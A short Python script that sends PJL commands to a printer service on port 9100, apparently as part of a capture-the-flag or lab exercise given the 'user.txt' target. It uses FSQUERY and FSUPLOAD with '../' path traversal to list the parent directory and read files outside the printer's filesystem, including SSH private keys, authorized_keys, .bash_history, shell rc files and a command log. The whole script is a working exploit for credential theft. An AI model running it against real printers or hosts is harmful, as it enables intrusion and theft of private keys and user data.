#!/usr/bin/env python3
"""Minimal high-value PJL reads (one file per connection, short)."""
import socket

HOST, PORT = "127.0.0.1", 9100

READS = [
    ("../user.txt", 40),
    ("../.bash_history", 6000),
    ("../.ssh/authorized_keys", 256),
    ("../.ssh/id_ed25519", 512),
    ("../.ssh/id_rsa", 4096),
    ("logs/commands.log", 12000),
    ("jetdirect.py", 6000),
    ("../.profile", 900),
    ("../.bashrc", 4000),
    ("../.lesshst", 200),
]


def one(path: str, size: int) -> None:
    try:
        s = socket.socket()
        s.settimeout(15)
        s.connect((HOST, PORT))
        s.sendall(f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={size}\r\n'.encode())
        data = b""
        while len(data) < size + 500:
            try:
                c = s.recv(65536)
                if not c:
                    break
                data += c
            except socket.timeout:
                break
        s.close()
        print(f"### {path} ({len(data)} bytes) ###")
        print(data.decode(errors="replace")[:11000])
    except Exception as e:
        print(f"### {path} ERR {e} ###")


print("INFO", end=" ")
try:
    s = socket.socket()
    s.settimeout(4)
    s.connect((HOST, PORT))
    s.sendall(b"@PJL INFO ID\r\n")
    print(s.recv(64))
    s.close()
except Exception as e:
    print(e)

q = socket.socket()
q.settimeout(8)
q.connect((HOST, PORT))
q.sendall(b'@PJL FSQUERY NAME=".."\r\n')
print("### FSQUERY .. ###")
print(q.recv(8192).decode(errors="replace")[:3000])
q.close()

for p, sz in READS:
    one(p, sz)